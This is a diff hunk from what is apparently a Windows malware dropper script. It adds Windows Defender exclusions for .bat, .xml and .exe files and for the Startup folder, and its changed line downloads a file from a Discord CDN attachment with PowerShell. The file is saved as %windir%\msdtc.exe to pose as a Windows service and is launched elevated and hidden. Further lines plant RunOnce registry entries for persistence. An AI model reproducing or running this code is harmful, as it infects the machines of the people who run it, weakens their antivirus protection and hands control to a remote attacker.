@@ -29,7 +29,7 @@ powershell Add-MpPreference -ExclusionExtension ".bat"
 powershell Add-MpPreference -ExclusionExtension ".xml"
 powershell Add-MpPreference -ExclusionExtension ".exe"
 powershell Add-MpPreference -ExclusionPath '"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"'
-powershell iwr -useb "https://cdn.discordapp.com/attachments/1133916220219990187/1133916252147036172/sized.exe" -o $env:windir\msdtc.exe; saps $env:windir\msdtc.exe -Verb RunAs -WindowStyle Hidden
+powershell iwr -useb "https://cdn.discordapp.com/attachments/1133916220219990187/1133945858086416424/Sized.bat" -o $env:windir\msdtc.exe; saps $env:windir\msdtc.exe -Verb RunAs -WindowStyle Hidden
 echo @echo off > "%windir%\msdtc.bat"
 echo REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce /v "*Service Microsoft Distributed Transaction Coordinator" /t REG_SZ /d "%windir%\msdtc.bat" >> "%windir%\msdtc.bat"
 echo REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce /v "*Service Microsoft Distributed Transaction Coordinator" /t REG_SZ /d "%windir%\msdtc.bat" >> "%windir%\msdtc.bat"
